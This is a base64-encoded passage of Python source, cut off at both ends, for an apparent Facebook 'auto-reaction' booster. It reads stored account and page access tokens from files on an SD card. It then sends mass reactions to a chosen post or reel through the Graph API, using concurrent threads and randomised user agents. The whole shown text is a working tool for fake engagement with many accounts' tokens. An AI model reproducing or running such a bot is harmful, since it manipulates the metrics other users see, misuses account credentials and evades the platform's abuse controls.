UgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgeiA9IGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBwb3N0IGxpbmsgb3IgSUQ6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoeikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdWlkX3VybCA9IHBvc3RfaWQgIAoKICAgIHByaW50KGYiIiIgICAge3llbGxvd31DaG9vc2UgdGhlIHJlYWN0aW9uIHR5cGU6CiAgICAge2JsdWV9WzFdIHtyZWR9TElLRSAg8J+RjfCfj7wKICAgICB7Ymx1ZX1bMl0ge3JlZH1MT1ZFIPCfkpwKICAgICB7Ymx1ZX1bM10ge3JlZH1XT1cg8J+YrwogICAgIHtibHVlfVs0XSB7cmVkfVNBRCDwn5iiCiAgICAge2JsdWV9WzVdIHtyZWR9QU5HUlkg8J+krAogICAgIHtibHVlfVs2XSB7cmVkfUhBSEEg8J+kowogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKICAgIAogICAgdHJ5OgogICAgICAgIHJlYWN0aW9uX2Nob2ljZSA9IGludChpbnB1dChmIiAgICAge2dyZWVufUNob29zZTogIikpCiAgICAgICAgcmVhY3Rpb25fbWFwID0gewogICAgICAgICAgICAxOiAiTElLRSIsCiAgICAgICAgICAgIDI6ICJMT1ZFIiwKICAgICAgICAgICAgMzogIldPVyIsCiAgICAgICAgICAgIDQ6ICJTQUQiLAogICAgICAgICAgICA1OiAiQU5HUlkiLAogICAgICAgICAgICA2OiAiSEFIQSIKICAgICAgICB9CiAgICAgICAgcmVhY3Rpb25fdHlwZSA9IHJlYWN0aW9uX21hcC5nZXQocmVhY3Rpb25fY2hvaWNlLCBOb25lKQogICAgICAgIGlmIHJlYWN0aW9uX3R5cGUgaXMgTm9uZToKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgcmVhY3Rpb24gY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgCiAgICB0cnk6CiAgICAgICAgbnVtX3JlYWN0aW9ucyA9IGludChpbnB1dChmIiAgICAge3llbGxvd31FbnRlciB0aGUgbnVtYmVyIG9mIHJlYWN0aW9uczogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyIGZvciByZWFjdGlvbnMuIikKICAgICAgICByZXR1cm4KCiAgICBtYXhfd29ya2VycyA9IDEwICAjIFNldCBhIGxpbWl0IGZvciB0aGUgbnVtYmVyIG9mIGNvbmN1cnJlbnQgdGhyZWFkcwogICAgcmVhY3Rpb25zX2NvdW50ID0gMCAgIyBDb3VudGVyIGZvciBzdWNjZXNzZnVsIHJlYWN0aW9ucwogICAgdG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgPSAwCiAgICByZXN1bHRzID0gW10gICMgU3RvcmUgcmVzdWx0cyBmb3IgZnVydGhlciBwcm9jZXNzaW5nCgogICAgdG9rZW5zX3VzZWQgPSAwICAjIFRyYWNrIHRoZSB0b3RhbCBudW1iZXIgb2YgdG9rZW5zIHVzZWQKICAgIAogICAgIyBLZWVwIHByb2Nlc3NpbmcgdG9rZW5zIHVudGlsIHdlIHJlYWNoIHRoZSBzdWNjZXNzZnVsIHJlYWN0aW9uIGxpbWl0CiAgICB3aGlsZSB0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9ucyA8IG51bV9yZWFjdGlvbnMgYW5kIHRva2Vuc191c2VkIDwgYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICByZW1haW5pbmdfdG9rZW5zID0gdG9rZW5zW3Rva2Vuc191c2VkOl0gICMgR2V0IHRoZSByZW1haW5pbmcgdG9rZW5zCiAgICAgICAgdG9rZW5zX2JhdGNoID0gcmVtYWluaW5nX3Rva2Vuc1s6bnVtX3JlYWN0aW9ucyAtIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zXSAgIyBHZXQgb25seSB0aGUgbmVlZGVkIHRva2VucwogICAgICAgIAogICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge2V4ZWN1dG9yLnN1Ym1pdChwZXJmb3JtX3JlYWN0aW9uLCB0b2tlbiwgdWlkX3VybCwgcmVhY3Rpb25fdHlwZSk6IHRva2VuIGZvciB0b2tlbiBpbiB0b2tlbnNfYmF0Y2h9CgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGFzX2NvbXBsZXRlZChmdXR1cmVfdG9fdG9rZW4pOgogICAgICAgICAgICAgICAgdG9rZW4gPSBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXQogICAgICAgICAgICAgICAgdWlkID0gdG9rZW4uc3BsaXQoJ3wnKVswXQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiwgc3RhdHVzX2NvZGUsIHJlc3BvbnNlX3RleHQgPSBmdXR1cmUucmVzdWx0KCkKICAgICAgICAgICAgICAgICAgICBpZiBzdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0aW9uc19jb3VudCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiICAgICB7d2hpdGV9W0FDQ09VTlQgVUlEXSB7Z3JlZW59e3VpZH0gIHt5ZWxsb3d9IHzilIDilIDilIDilIDilIDilIDilIB7cmVkfeKepCB7Z3JlZW59U1VDQ0VTU0ZVTExZIHt5ZWxsb3d9IFJFQUNURUQhIikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAe3JlZH0g4oCiIHt5ZWxsb3d94oCiIHtncmVlbn3igKIge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbiB7dG9rZW59OiB7ZX0iKQogICAgICAgIAogICAgICAgIHRva2Vuc191c2VkICs9IGxlbih0b2tlbnNfYmF0Y2gpICAjIFVwZGF0ZSB0aGUgdG90YWwgdG9rZW5zIHVzZWQKICAgICAgICAKICAgICAgICAjIEJyZWFrIGlmIHdlIHJ1biBvdXQgb2YgdG9rZW5zCiAgICAgICAgaWYgdG9rZW5zX3VzZWQgPj0gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoIk5vIG1vcmUgdG9rZW5zIGF2YWlsYWJsZS4iKQogICAgICAgICAgICBicmVhawoKICAgIHByaW50KGYie2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIntncmVlbn1UT1RBTCBTVUNDRVNTRlVMIFJFQUNUSU9OUzoge3RvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zfSIpCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yLCBhc19jb21wbGV0ZWQKCmRlZiBwZXJmb3JtX3JlYWN0aW9uKHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKToKICAgICIiIlNlbmQgYSByZWFjdGlvbiB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3BsaXQoJ3wnKVsxXSAgIyBBc3N1bWluZyBmb3JtYXQgaXMgZW1haWx8YWNjZXNzX3Rva2VuCiAgICBhdXRvX3JlYWN0ID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dWlkX3VybH0vcmVhY3Rpb25zP3R5cGU9e3JlYWN0aW9uX3R5cGV9JmFjY2Vzc190b2tlbj17YWNjZXNzX3Rva2VufScKICAgIGhlYWRlcnNfID0gewogICAgICAgICdVc2VyLUFnZW50JzogV191ZXJhZ250KCkgICMgVXNlIHRoZSByYW5kb21seSBzZWxlY3RlZCB1c2VyIGFnZW50CiAgICB9CiAgICAKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoYXV0b19yZWFjdCwgaGVhZGVycz1oZWFkZXJzXykKICAgICAgICByZXR1cm4gYWNjZXNzX3Rva2VuLCByZXNwb25zZS5zdGF0dXNfY29kZSwgcmVzcG9uc2UudGV4dCAgIyBSZXR1cm4gdGhlIHJlc3VsdHMgZm9yIGZ1cnRoZXIgcHJvY2Vzc2luZwogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBhY2Nlc3NfdG9rZW4sIE5vbmUsIHN0cihlKSAgIyBIYW5kbGUgcmVxdWVzdCBleGNlcHRpb25zCgpkZWYgcmVlbHMoKToKICAgICIiIlBlcmZvcm0gcmVhY3Rpb25zIGJhc2VkIG9uIHVzZXIgaW5wdXQgZm9yIGZpbGUgY2hvaWNlLCBzdGFydGluZyBsaW5lLCBwb3N0IGxpbmssIHJlYWN0aW9uIHR5cGUsIGFuZCBudW1iZXIgb2YgcmVhY3Rpb25zLiIiIgogICAgICAgCiAgICAjIFN0ZXAgMTogQXNrIHRoZSB1c2VyIHdoaWNoIGZpbGUgdG8gdXNlCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdICB7cmVkfSBFWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikgICMgRGlzcGxheSBvbmx5IHRoZSBmaWxlbmFtZQogICAgCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZTogICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDI6IExvYWQgdGhlIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBFbnN1cmUgbm8gZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfXtyZWR9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgc3RhcnRfbGluZSA8IDEgb3Igc3RhcnRfbGluZSA+IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KGYiUGxlYXNlIGVudGVyIGEgdmFsaWQgbGluZSBudW1iZXIgYmV0d2VlbiAxIGFuZCB7YXZhaWxhYmxlX3Rva2Vuc30uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0gICMgVXNlIHRva2VucyBzdGFydGluZyBmcm9tIHRoZSBzZWxlY3RlZCBsaW5lCiAgICAKICAgIHByaW50KGYiICAgIHtncmVlbn1GT1JNQVQge3llbGxvd306IHtyZWR9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3JlZWwvMjY2NzQzNDMyMDg4NDczNTg/bWliZXh0aWQ9clM0MGFCN1M5VWNieHc2diIpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHogPSBpbnB1dChmIiAgIHtncmVlbn1FbnRlciB0aGUgcG9zdCBsaW5rIG9yIElEOiAiKQogICAgcG9zdF9pZCA9IGdldF9jb21iaW5lZF9kYXRhKHopCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHVpZF91cmwgPSBwb3N0X2lkICAKCiAgICBwcmludChmIiIiICAgIHt5ZWxsb3d9Q2hvb3NlIHRoZSByZWFjdGlvbiB0eXBlOgogICAgIHtibHVlfVsxXSB7Z3JlZW59TElLRQogICAgIHtibHVlfVsyXSB7Z3JlZW59TE9WRQogICAgIHtibHVlfVszXSB7Z3JlZW59V09XCiAgICAge2JsdWV9WzRdIHtncmVlbn1TQUQKICAgICB7Ymx1ZX1bNV0ge2dyZWVufUFOR1JZCiAgICAge2JsdWV9WzZdIHtncmVlbn1IQUhBCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQogICAgCiAgICB0cnk6CiAgICAgICAgcmVhY3Rpb25fY2hvaWNlID0gaW50KGlucHV0KGYiICAgICB7Z3JlZW59Q2hvb3NlOiAiKSkKICAgICAgICByZWFjdGlvbl9tYXAgPSB7CiAgICAgICAgICAgIDE6ICJMSUtFIiwKICAgICAgICAgICAgMjogIkxPVkUiLAogICAgICAgICAgICAzOiAiV09XIiwKICAgICAgICAgICAgNDogIlNBRCIsCiAgICAgICAgICAgIDU6ICJBTkdSWSIsCiAgICAgICAgICAgIDY6ICJIQUhBIgogICAgICAgIH0KICAgICAgICByZWFjdGlvbl90eXBlID0gcmVhY3Rpb25fbWFwLmdldChyZWFjdGlvbl9jaG9pY2UsIE5vbmUpCiAgICAgICAgaWYgcmVhY3Rpb25fdHlwZSBpcyBOb25lOgogICAgICAgICAgICBwcmludCgiSW52YWxpZCByZWFjdGlvbiBjaG9pY2UuIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAKICAgIHRyeToKICAgICAgICBudW1fcmVhY3Rpb25zID0gaW50KGlucHV0KGYiICAgICB7eWVsbG93fUVudGVyIHRoZSBudW1iZXIgb2YgcmVhY3Rpb25zOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgZm9yIHJlYWN0aW9ucy4iKQogICAgICAgIHJldHVybgoKICAgIG1heF93b3JrZXJzID0gMTAgICMgU2V0IGEgbGltaXQgZm9yIHRoZSBudW1iZXIgb2YgY29uY3VycmVudCB0aHJlYWRzCiAgICByZWFjdGlvbnNfY291bnQgPSAwICAjIENvdW50ZXIgZm9yIHN1Y2Nlc3NmdWwgcmVhY3Rpb25zCiAgICB0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9ucyA9IDAKICAgIHJlc3VsdHMgPSBbXSAgIyBTdG9yZSByZXN1bHRzIGZvciBmdXJ0aGVyIHByb2Nlc3NpbmcKCiAgICB0b2tlbnNfdXNlZCA9IDAgICMgVHJhY2sgdGhlIHRvdGFsIG51bWJlciBvZiB0b2tlbnMgdXNlZAogICAgCiAgICAjIEtlZXAgcHJvY2Vzc2luZyB0b2tlbnMgdW50aWwgd2UgcmVhY2ggdGhlIHN1Y2Nlc3NmdWwgcmVhY3Rpb24gbGltaXQKICAgIHdoaWxlIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zIDwgbnVtX3JlYWN0aW9ucyBhbmQgdG9rZW5zX3VzZWQgPCBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgIHJlbWFpbmluZ190b2tlbnMgPSB0b2tlbnNbdG9rZW5zX3VzZWQ6XSAgIyBHZXQgdGhlIHJlbWFpbmluZyB0b2tlbnMKICAgICAgICB0b2tlbnNfYmF0Y2ggPSByZW1haW5pbmdfdG9rZW5zWzpudW1fcmVhY3Rpb25zIC0gdG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnNdICAjIEdldCBvbmx5IHRoZSBuZWVkZWQgdG9rZW5zCiAgICAgICAgCiAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9bWF4X3dvcmtlcnMpIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW4gPSB7ZXhlY3V0b3Iuc3VibWl0KHBlcmZvcm1fcmVhY3Rpb24sIHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKTogdG9rZW4gZm9yIHRva2VuIGluIHRva2Vuc19iYXRjaH0KCiAgICAgICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgICAgICB0b2tlbiA9IGZ1dHVyZV90b190b2tlbltmdXR1cmVdCiAgICAgICAgICAgICAgICB1aWQgPSB0b2tlbi5zcGxpdCgnfCcpWzBdCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuLCBzdGF0dXNfY29kZSwgcmVzcG9uc2VfdGV4dCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgICAgIGlmIHN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgcmVhY3Rpb25zX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgICAgIHtyZWR9W1JFQUNUT1JdIHt5ZWxsb3d9e3VpZH0gIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufVNVQ0NFU1NGVUxMWSBSRUFDVEVEISIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbiB7dG9rZW59OiB7ZX0iKQogICAgICAgIAogICAgICAgIHRva2Vuc191c2VkICs9IGxlbih0b2tlbnNfYmF0Y2gpICAjIFVwZGF0ZSB0aGUgdG90YWwgdG9rZW5zIHVzZWQKICAgICAgICAKICAgICAgICAjIEJyZWFrIGlmIHdlIHJ1biBvdXQgb2YgdG9rZW5zCiAgICAgICAgaWYgdG9rZW5zX3Vz